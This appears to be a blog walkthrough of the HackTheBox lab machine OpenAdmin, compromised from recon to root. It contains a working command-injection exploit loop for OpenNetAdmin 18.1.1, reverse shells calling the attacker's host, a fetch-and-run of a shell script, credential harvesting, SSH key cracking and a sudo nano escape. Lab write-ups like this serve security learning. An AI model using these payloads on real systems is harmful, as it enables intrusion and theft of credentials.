---
title: "HackTheBox: OpenAdmin | Walkthrough"
date: 2020-05-02
categories: [hackthebox]
tags: [opennetadmin, linux, hackthebox]
---

## Recon

As always, let's start with an nmap scan.

```sh
export ipaddress=10.10.10.171
ports=$(nmap -p- --min-rate=1000 -T4 $ipaddress | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -A -p$ports $ipaddress -o nmap
````

Output:

```
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
12567/tcp closed unknown
62072/tcp closed unknown
```

Pretty simple, we see port 22 and 80 open. Fairly standard.
Now, let's see what it's hosting on the webserver.

We see the default Apache page. Let's try some content discovery:

```sh
dirsearch -u http://10.10.10.171/ -e /
```

Using `dirsearch`, we see quite a few paths but `/ona/` seems different and interesting. Let's check it out.

Looking at the page, we see that it is OpenNetAdmin.
The version in use is **18.1.1**. Let's see if it has any readily available exploit.

```sh
searchsploit opennetadmin
```

We see an RCE script for it. Let's copy it over.

```sh
cp /usr/share/exploitdb/exploits/php/webapps/47691.sh exploit.sh
```

For some reason, I was having issues with this script, so I copied the curl command and ran it directly. That worked. Then, I wrote a different script for it:

```bash
#!/bin/bash

URL=$1
while true; do
  read -p "$ " cmd
  curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Running the script:

```sh
bash exploit.sh http://10.10.10.171/ona/
```

We do get what seems like a shell, but every time we run a command, it uses curl to send the payload. I'd rather have a netcat reverse shell.

However, when you try a normal reverse shell:

```sh
nc 10.10.14.39 4444 -e /bin/bash
```

…it doesn’t work. The payload didn’t like the hyphen.

So, on my attacker machine, I wrote a bash reverse shell:

```sh
cat shell.sh
/bin/bash -i >& /dev/tcp/10.10.14.39/4444 0>&1
```

Then started a Python web server:

```sh
python -m http.server 80
```

On the victim machine:

```sh
wget http://10.10.14.39/shell.sh
bash shell.sh
```

And finally, a reverse shell. Nice.

Now, let's improve this shell:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

Back in attacker machine:

```sh
stty raw -echo
fg
```

You might not see what you type, but run:

```sh
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <num>
```

*(This trick was taken from: [ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/))*

---

## User 1

Looking around in the webserver, in `/var/www/html/ona` we see a local directory.

```sh
ls -al local
ls -al local/config
```

Here, we see `database_settings.inc.php`:

```sh
cat database_settings.inc.php
```

We get:

```php
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
```

Nice, we have a password. Let’s check users:

```sh
cat /etc/passwd
```

We see 2 users: **jimmy** and **joanna**.
Let’s try the password with jimmy:

```sh
su - jimmy
```

And nice, we are jimmy now.

---

## User 2

```sh
cd /var/www/
ls -al
```

The directory `internal` is owned by jimmy. Inside, we see `index.php`, `logout.php`, and `main.php`.

Checking `index.php`, we find a SHA512 hash for jimmy’s password:

```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
```

Then, checking `main.php`:

```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
```

Wow — it serves Joanna’s private SSH key.
Let’s check if this site listens locally:

```sh
netstat -tupan | grep -i listen
```

We find port **52846** only on localhost. Let’s curl it:

```sh
curl http://127.0.0.1:52846/main.php
```

This reveals Joanna’s **encrypted RSA private key**.

Save it as `id_rsa`, then:

```sh
chmod 600 id_rsa
ssh joanna@10.10.10.171 -i id_rsa
```

It asks for a password. As expected. Let’s crack it.

Convert to john format:

```sh
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
```

The password is cracked: **bloodninjas**.

Now login:

```sh
ssh joanna@10.10.10.171 -i id_rsa
```

Enter the password. You are in as Joanna.
Grab `user.txt` from her home directory.

---

## Root

Check sudo privileges:

```sh
sudo -l
```

We see:

```
(ALL) NOPASSWD: /bin/nano /opt/priv
```

From [GTFOBins](https://gtfobins.github.io/gtfobins/nano/), we can exploit nano:

```sh
sudo /bin/nano /opt/priv
```

Inside nano:
Press `Ctrl+R`, then `Ctrl+X` and enter:

```
reset; sh 1>&0 2>&0
```

Now you have a root shell:

```sh
whoami
# root
```

Congratulations, root!

